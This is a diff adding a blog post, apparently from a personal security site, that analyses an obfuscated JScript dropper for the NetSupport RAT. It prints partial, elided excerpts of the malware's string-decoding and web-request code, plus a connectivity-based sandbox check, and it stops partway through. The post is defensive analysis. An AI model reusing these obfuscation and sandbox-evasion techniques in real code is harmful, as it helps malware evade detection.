@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Analysing a NetSupport RAT Sample | Anushan Lingam</title>
+<meta property="og:title" content="Analysing a NetSupport RAT Sample | Anushan Lingam" />
+<meta name="twitter:title" content="Analysing a NetSupport RAT Sample | Anushan Lingam" />
+<meta itemprop="name" content="Analysing a NetSupport RAT Sample | Anushan Lingam" />
+<meta name="application-name" content="Analysing a NetSupport RAT Sample | Anushan Lingam" />
+<meta property="og:site_name" content="Anushan Lingam" />
+
+<meta name="description" content="An analysis of a new NetSupport RAT sample found on Any.Run including a breakdown of the intial JScript file and of the second and final stage payloads.">
+<meta itemprop="description" content="An analysis of a new NetSupport RAT sample found on Any.Run including a breakdown of the intial JScript file and of the second and final stage payloads." />
+<meta property="og:description" content="An analysis of a new NetSupport RAT sample found on Any.Run including a breakdown of the intial JScript file and of the second and final stage payloads." />
+<meta name="twitter:description" content="An analysis of a new NetSupport RAT sample found on Any.Run including a breakdown of the intial JScript file and of the second and final stage payloads." />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+
+
+  <meta itemprop="image" content="https://blog.anushanlingam.com/" />
+  <meta property="og:image" content="https://blog.anushanlingam.com/" />
+  <meta name="twitter:image" content="https://blog.anushanlingam.com/" />
+  <meta name="twitter:image:src" content="https://blog.anushanlingam.com/" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-06-03T09:10:30&#43;0100 />
+    <meta property="article:published_time" content=2023-06-03T09:10:30&#43;0100 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Analysing a NetSupport RAT Sample",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-06-03",
+        "description": "An analysis of a new NetSupport RAT sample found on Any.Run including a breakdown of the intial JScript file and of the second and final stage payloads.",
+        "wordCount":  2429 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-06-03",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Anushan Lingam"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.111.3">
+
+    
+
+    <link rel="canonical" href="https://blog.anushanlingam.com/posts/20230603_netsupport_rat/">
+    <link href="/style.min.e8353c8bf6aa84457d3c7f65980d94548f249c91e6b37b15b9f1c7e13ceed431.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://blog.anushanlingam.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "dark" class="notransition">
+<script src="/js/themeLoader.min.3c3396ae9effcbd02e7064baa7b435ffe6560bcd7fec0b428a470d3a128f2220.js"></script>
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://blog.anushanlingam.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Analysing a NetSupport RAT Sample</h1>
+                
+                <div class="post-meta">
+                    <time datetime="2023-06-03T09:10:30&#43;01:00" itemprop="datePublished"> 3 Jun 2023 </time>
+                </div>
+            </header>
+            <details class="toc">
+                <summary><b>Table of Contents</b></summary>
+                <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#breaking-down-the-initial-jscript-file">Breaking Down the Initial JScript File</a>
+      <ul>
+        <li><a href="#decode-helper---m">Decode Helper - M()</a></li>
+        <li><a href="#string-store---s">String Store - s()</a></li>
+        <li><a href="#base64decode">base64Decode()</a></li>
+        <li><a href="#checkurl">checkURL()</a></li>
+        <li><a href="#demystifying-g">Demystifying &lsquo;G()&rsquo;</a></li>
+        <li><a href="#putting-the-pieces-together">Putting the Pieces together</a></li>
+      </ul>
+    </li>
+    <li><a href="#second-stage-payload">Second Stage Payload</a>
+      <ul>
+        <li><a href="#dynamically-generating-file-paths">Dynamically Generating File Paths</a></li>
+        <li><a href="#fetching-final-payload">Fetching Final Payload</a></li>
+        <li><a href="#establishing-persistence">Establishing Persistence</a></li>
+      </ul>
+    </li>
+    <li><a href="#netsupport-rat---client32exe">NetSupport RAT - Client32.exe</a>
+      <ul>
+        <li><a href="#netsupport-config-file">NetSupport Config File</a></li>
+      </ul>
+    </li>
+    <li><a href="#indicators-of-compromise-iocs">Indicators of Compromise (IOC&rsquo;s)</a>
+      <ul>
+        <li><a href="#network-indicators">Network Indicators</a></li>
+        <li><a href="#host-indicators">Host Indicators</a></li>
+        <li><a href="#sample-download">Sample Download</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+            </details><div class="page-content">
+                <h2 id="introduction">Introduction</h2>
+<p>While exploring Malware Bazar and Any.Run public submissions in search of intriguing samples, I stumbled upon a script that caught my attention. This was a JScript file that was intended to be executed by the Windows Scripting engine and exhibited the usual assortment of peculiarly named functions and confusing variable names.</p>
+<p>After subjecting the script to VirusTotal analysis, I discovered that no vendors had flagged it (as of May 31, 2023), indicating it was a new sample. Further investigation of the initial JS script and extraction of two additional payloads revealed that it was, in fact, a variant of the NetSupport remote access trojan.</p>
+<h2 id="breaking-down-the-initial-jscript-file">Breaking Down the Initial JScript File</h2>
+<p>The precise delivery mechanism for this particular sample remains unknown, as only the JScript file itself was uploaded to the sandbox. However, based on previous instances of NetSupport RAT, the most probable delivery method would involve a phishing email containing a malicious Office document or ISO file. Opening such a file would trigger the execution of this JScript file through the Windows cscript interpreter.</p>
+<p>The script features a series of vaguely named nested functions, followed by a relatively less obfuscated code block responsible for the execution. These functions are utilized within this block to carry out various operations, to download and execute the next stage.</p>
+<p>After passing the original script through a JavaScript beautifier, it becomes evident that there are five main functions declared, each containing several nested functions. The majority of these functions appear to be focused on decoding and assembling various URLs and WScript object strings used for obtaining and invoking the second stage payload.</p>
+<h3 id="decode-helper---m">Decode Helper - M()</h3>
+<p>This function encompasses multiple dictionary objects that store the arguments intended for the &lsquo;G()&rsquo; function. Additionally, it incorporates other dictionary objects used for declaring supplementary functions that modify incoming arguments before forwarding the data to the main &lsquo;G()&rsquo; function. It is worth noting the presence of redundant variables in this function, as well as in the accompanying helper functions, likely added to obfuscate the script further.</p>
+<p>Note: Throughout the script, you will come across multiple instances of two-letter variable declarations, such as &lsquo;G0 = sP&rsquo; in the following example. These declarations are used as proxies for the &lsquo;G()&rsquo; function, making it intentionally challenging to track. However, despite the obfuscation, the pattern of arguments passed to this function remains consistent, making it relatively straightforward to identify, as demonstrated in the subsequent section.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">M</span><span class="p">(</span><span class="nx">F</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">eR</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">F</span><span class="o">:</span> <span class="mh">0x2b6</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">r</span><span class="o">:</span> <span class="s1">&#39;[]$G&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">e</span><span class="o">:</span> <span class="mh">0x2b7</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">q</span><span class="o">:</span> <span class="s1">&#39;CI3i&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">G0</span> <span class="o">=</span> <span class="nx">sP</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;GKWOM&#39;</span><span class="o">:</span> <span class="nx">G0</span><span class="p">(</span><span class="nx">eR</span><span class="p">.</span><span class="nx">F</span><span class="p">,</span> <span class="nx">eR</span><span class="p">.</span><span class="nx">r</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;ekGeE&#39;</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">q</span><span class="p">,</span> <span class="nx">N</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">q</span> <span class="o">+</span> <span class="nx">N</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="string-store---s">String Store - s()</h3>
+<p>This is a simple function that returns a list of what seems to be random strings of varying length. This is used in the &lsquo;G()&rsquo; function to retrive a specific index from the returned list based on the arguments provided.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">s</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">el</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;WPK4SNSMWLWK&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;WADAWDJADSAAF/DSFKSJSDASDSA&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;PO4JFNHCN3Lkxj3Kn9D&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">s</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">el</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">s</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="base64decode">base64Decode()</h3>
+<p>As you probably guessed, this function takes in a base64 string as an argument and returns the decoded string. Running the base64 string that the script tries to decode through external tools such as CyberChef yields identical output, indicating that no specialized decoding occurs within this function.</p>
+<h3 id="checkurl">checkURL()</h3>
+<p>Again, quite self explanatory. This contain a large amount of dictionary variables like the &lsquo;M()&rsquo; function that are used in conjunction with the &lsquo;G()&rsquo; function to construct the argument strings for creating a new instance of the MSXML2.ServerXMLHTTP ActiveXObject which is then used to make a web request to URL provided as an argument before finally returning the status code of the request outcome.</p>
+<p>In the following snippet of the checkURL function, the accompanying comments show the deobfuscated version of the script lines</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">checkURL</span><span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">e8</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">F</span><span class="o">:</span> <span class="mh">0x213</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">r</span><span class="o">:</span> <span class="s1">&#39;qPz!&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">e</span><span class="o">:</span> <span class="mh">0x214</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">q</span><span class="o">:</span> <span class="s1">&#39;CI3i&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">...</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">l</span><span class="o">:</span> <span class="s1">&#39;w9^7&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">FG</span> <span class="o">=</span> <span class="nx">G</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;GKWOM&#39;</span><span class="o">:</span> <span class="nx">G0</span><span class="p">(</span><span class="nx">eR</span><span class="p">.</span><span class="nx">F</span><span class="p">,</span> <span class="nx">eR</span><span class="p">.</span><span class="nx">r</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;ekGeE&#39;</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">q</span><span class="p">,</span> <span class="nx">N</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">q</span> <span class="o">+</span> <span class="nx">N</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;ZfWju&#39;</span><span class="o">:</span> <span class="nx">Fw</span><span class="p">(</span><span class="mh">0x224</span><span class="p">,</span> <span class="nx">e8</span><span class="p">.</span><span class="nx">g</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">N</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="nx">FG</span><span class="p">(</span><span class="nx">e8</span><span class="p">.</span><span class="nx">R</span><span class="p">,</span> <span class="nx">e8</span><span class="p">.</span><span class="nx">l</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//  var N = new ActiveXObject(&#34;MSXML2.ServerXMLHTTP&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">N</span><span class="p">[</span><span class="nx">FG</span><span class="p">(</span><span class="nx">e8</span><span class="p">.</span><span class="nx">h</span><span class="p">,</span> <span class="s1">&#39;oyrk&#39;</span><span class="p">)](</span><span class="nx">e</span><span class="p">[</span><span class="nx">Fe</span><span class="p">(</span><span class="nx">e8</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="s1">&#39;w9^7&#39;</span><span class="p">),</span> <span class="nx">r</span><span class="p">,</span> <span class="o">!</span><span class="p">[]]);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//  N[&#34;Open&#34;](&#34;GET&#34;, r, false);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">N</span><span class="p">[</span><span class="nx">FV</span><span class="p">(</span><span class="nx">e8</span><span class="p">.</span><span class="nx">c</span><span class="p">,</span> <span class="nx">e8</span><span class="p">.</span><span class="nx">L</span><span class="p">)]();</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//  N[&#39;send&#39;]();
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nx">N</span><span class="p">[</span><span class="nx">FV</span><span class="p">(</span><span class="mh">0x299</span><span class="p">,</span> <span class="nx">e8</span><span class="p">.</span><span class="nx">a</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//  return N[&#39;status&#39;]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><h3 id="demystifying-g">Demystifying &lsquo;G()&rsquo;</h3>
+<p>This function appears to do all the heavy lifting when it comes to constructing the strings used as arguments for all the other JS functions as well as the ActiveXObject calls that take place.</p>
+<p>The execution of this function is as follows:</p>
+<ol>
+<li>It is invoked with two arguments: a hexadecimal value (e.g., &lsquo;0x29d&rsquo;) and a string consisting of four random characters.</li>
+<li>The &rsquo;s()&rsquo; function is called and its return value is stored in a variable called &lsquo;r&rsquo;. This variable holds an array of predefined strings.</li>
+<li>The hexadecimal argument is subtracted by 465, and the resulting number is used as an index to retrieve a specific string from the &lsquo;r&rsquo; array.</li>
+<li>This retrieved value and the second argument to the &lsquo;G&rsquo; function are utilized in various string operations, such as character code retrieval and manipulation, to generate the final decoded string.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">G</span><span class="p">(</span><span class="nx">M</span><span class="p">,</span> <span class="nx">F</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="nx">s</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">G</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">q</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">e</span> <span class="o">=</span> <span class="nx">e</span> <span class="o">-</span> <span class="mh">0x1d1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">N</span> <span class="o">=</span> <span class="nx">r</span><span class="p">[</span><span class="nx">e</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">If</span> <span class="p">(</span><span class="nx">G</span><span class="p">[</span><span class="s1">&#39;pQmmeK&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">var</span> <span class="nx">B</span> <span class="o">=</span> <span class="s1">&#39;abcdefg...ABCDEFG...0124&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">var</span> <span class="nx">D</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">U</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> <span class="nx">S</span><span class="p">,</span> <span class="nx">o</span><span class="p">,</span> <span class="nx">I</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="nx">o</span> <span class="o">=</span> <span class="nx">m</span><span class="p">[</span><span class="s1">&#39;charAt&#39;</span><span class="p">](</span><span class="nx">I</span><span class="o">++</span><span class="p">);</span> <span class="o">~</span><span class="nx">o</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">S</span> <span class="o">=</span> <span class="nx">U</span> <span class="o">%</span> <span class="mh">0X4</span> <span class="o">?</span> <span class="nx">S</span> <span class="o">*</span> <span class="mh">0X40</span> <span class="o">+</span> <span class="nx">o</span> <span class="o">:</span> <span class="nx">o</span><span class="p">,</span> <span class="nx">U</span><span class="o">++</span> <span class="o">%</span> <span class="mh">0x4</span><span class="p">)</span> <span class="o">?</span> <span class="nx">D</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">[</span><span class="s1">&#39;fromCharCode&#39;</span><span class="p">](</span><span class="nx">oxff</span> <span class="o">&amp;</span> <span class="nx">S</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="o">-</span><span class="mh">0x2</span> <span class="o">*</span> <span class="nx">U</span> <span class="o">&amp;</span> <span class="mh">0x6</span><span class="p">))</span> <span class="o">:</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">o</span> <span class="o">=</span> <span class="nx">B</span><span class="p">[</span><span class="s1">&#39;indexOf&#39;</span><span class="p">](</span><span class="nx">o</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> <span class="nx">C</span> <span class="o">=</span> <span class="nx">D</span><span class="p">[</span><span class="s1">&#39;length&#39;</span><span class="p">];</span> <span class="nx">b</span> <span class="o">&lt;</span> <span class="nx">C</span><span class="p">;</span> <span class="nx">b</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">j</span> <span class="o">+=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="s1">&#39;00&#39;</span> <span class="o">+</span> <span class="nx">D</span><span class="p">[</span><span class="s1">&#39;charCodeAt&#39;</span><span class="p">](</span><span class="nx">b</span><span class="p">)[</span><span class="s1">&#39;toString&#39;</span><span class="p">](</span><span class="mh">0x10</span><span class="p">))[</span><span class="s1">&#39;slice&#39;</span><span class="p">](</span><span class="o">-</span><span class="mh">0x2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">j</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">G</span><span class="p">(</span><span class="nx">M</span><span class="p">,</span> <span class="nx">F</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="putting-the-pieces-together">Putting the Pieces together</h3>
+<p>With an understanding of what the various function calls do, let&rsquo;s examine the actual code block responsible for retrieving and executing the second stage payload.</p>
+<p>In the following code snippets, alongside the original code, you will find comments indicating the deobfuscated version of each line.</p>
+<p>As previously mentioned, any reference to a two-letter function, such as &lsquo;sP&rsquo;, can be considered as an alias for &lsquo;G()&rsquo; in the following code snippets. At the beginning of the script, there are several combinations of two letters that are assigned the value of &lsquo;G&rsquo;.</p>
+<h5 id="rudimentary-sandbox-check">Rudimentary Sandbox Check</h5>
+<p>The script starts by utilizing the &lsquo;checkURL&rsquo; function to test network connectivity to Microsoft, Twitter, and Facebook. It sends requests to these endpoints and checks if the responses return a status code of &lsquo;200&rsquo;. If any of the requests do not yield a successful &lsquo;200&rsquo; status code, the script terminates.</p>
+<p>If the connection requests are sucessful, the script sleeps for 5 seconds before continuing execution.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">microsoftURL</span> <span class="o">=</span> <span class="s1">&#39;https://www.microsoft.com&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">twitterURL</span> <span class="o">=</span> <span class="nx">sP</span><span class="p">(</span><span class="mh">0x29a</span><span class="p">,</span> <span class="s1">&#39;lU$R&#39;</span><span class="p">);</span> <span class="c1">// https://www.twitter.com
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">facebookURL</span> <span class="o">=</span> <span class="nx">sP</span><span class="p">(</span><span class="mh">0x29b</span><span class="p">,</span> <span class="s1">&#39;MUDO&#39;</span><span class="p">);</span> <span class="c1">// https://www.facebook.com
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">microsoftStatus</span> <span class="o">=</span> <span class="nx">checkURL</span><span class="p">(</span><span class="nx">microsoftURL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">twitterStatus</span> <span class="o">=</span> <span class="nx">checkURL</span><span class="p">(</span><span class="nx">twitterStatus</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">facebookStatus</span> <span class="o">=</span> <span class="nx">checkURL</span><span class="p">(</span><span class="nx">facebookStatus</span><span class="p">);</span>
